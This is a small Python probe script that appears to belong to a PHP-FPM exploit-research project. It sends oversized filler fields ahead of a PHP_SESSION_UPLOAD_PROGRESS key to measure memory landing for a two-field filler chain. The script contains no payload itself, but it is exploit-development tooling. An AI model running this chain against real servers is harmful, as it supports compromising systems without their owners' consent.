#!/usr/bin/env python3
"""Send two BIG fields (BIG_DT, BIG_E) before the upload-progress key.

Used to measure the *combined* landing of the two-field filler described in
docs/research/fpm-128m.md §2.3: a 16KB field first shifts the 96KB field, so the single-field
page table cannot be used directly.

Usage:
  python3 tools/fpm_twofield_probe.py http://127.0.0.1 16384 98304
  python3 tools/fpm_twofield_probe.py http://IP 16384 98304 --page /plain.php \
      --sid scal
"""
from __future__ import annotations

import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import fpm_chain  # noqa: E402


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("url")
    ap.add_argument("n1", type=int, help="BIG_DT size in bytes")
    ap.add_argument("n2", type=int, help="BIG_E size in bytes")
    ap.add_argument("--page", default="/plain.php")
    ap.add_argument("--sid", default="scal")
    ap.add_argument("--lead", type=int, default=0)
    ap.add_argument("--lead-size", type=int, default=1)
    ap.add_argument("--timeout", type=float, default=30.0)
    a = ap.parse_args()

    t = fpm_chain.Fpm(a.url, timeout=a.timeout)
    parts = []
    for i in range(a.lead):
        parts.append(("lead%d" % i, b"x" * a.lead_size, None))
    if a.n1 > 0:
        parts.append(("BIG_DT", b"A" * a.n1, None))
    if a.n2 > 0:
        parts.append(("BIG_E", b"A" * a.n2, None))
    parts += [
        ("PHP_SESSION_UPLOAD_PROGRESS", b"K", None),
        ("f", b"Z", b"a.bin"),
    ]
    print("post ->", t.post(parts, a.sid, a.page)[0])
    return 0


if __name__ == "__main__":
    sys.exit(main())
